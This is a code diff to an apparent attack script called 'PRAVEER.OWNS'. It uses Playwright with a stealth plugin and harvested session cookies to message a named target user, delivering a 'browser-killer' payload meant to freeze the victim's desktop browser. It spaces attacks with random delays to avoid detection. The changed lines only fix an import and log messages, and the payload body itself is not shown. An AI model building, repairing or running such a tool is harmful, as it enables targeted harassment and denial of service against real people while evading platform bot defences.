@@ -1,11 +1,11 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (LONE-WOLF FINAL-FIX)
-# 📅 STATUS: IMPORT-FIXED | DESKTOP-FREEZE | 1-ID-STABLE
+# 🚀 PROJECT: PRAVEER.OWNS (FINAL-FIX-V3)
+# 📅 STATUS: NAMESPACE-ISOLATED | 1-ID-STABLE | BROWSER-FREEZE
 
 import os, asyncio, random, sys
 from playwright.async_api import async_playwright
-# --- THE FIX: Import the function specifically from the module ---
-from playwright_stealth import stealth 
+# --- THE ULTIMATE FIX: Aliasing the function to avoid module collision ---
+from playwright_stealth import stealth as stealth_async
 
 def get_kernel_stop_payload(target_name):
     """Targets Desktop Browser Layout Engines."""
@@ -36,8 +36,8 @@ async def agent_blitz(machine_id, cookie_list, target_id, target_name):
         )
         page = await context.new_page()
         
-        # ✅ THE CALL: Now it calls the function, not the module
-        await stealth(page)
+        # ✅ THE CALL: Using the alias to ensure it calls the function
+        await stealth_async(page)
         
         try:
             print(f"📡 [M{machine_id}] Establishing Stealth Connection...")
@@ -62,7 +62,7 @@ async def agent_blitz(machine_id, cookie_list, target_id, target_name):
                 await asyncio.sleep(random.uniform(3, 5)) 
                 await page.keyboard.press("Enter")
                 
-                print(f"💀 [M{machine_id}] Browser-Killer Delivered. UI Thread Saturation: MAX.")
+                print(f"💀 [M{machine_id}] Browser-Killer Delivered. Target UI Locked.")
 
                 # ⏳ THE 'SAFETY GAP' (120-150 seconds)
                 sleep_time = random.uniform(120, 150)
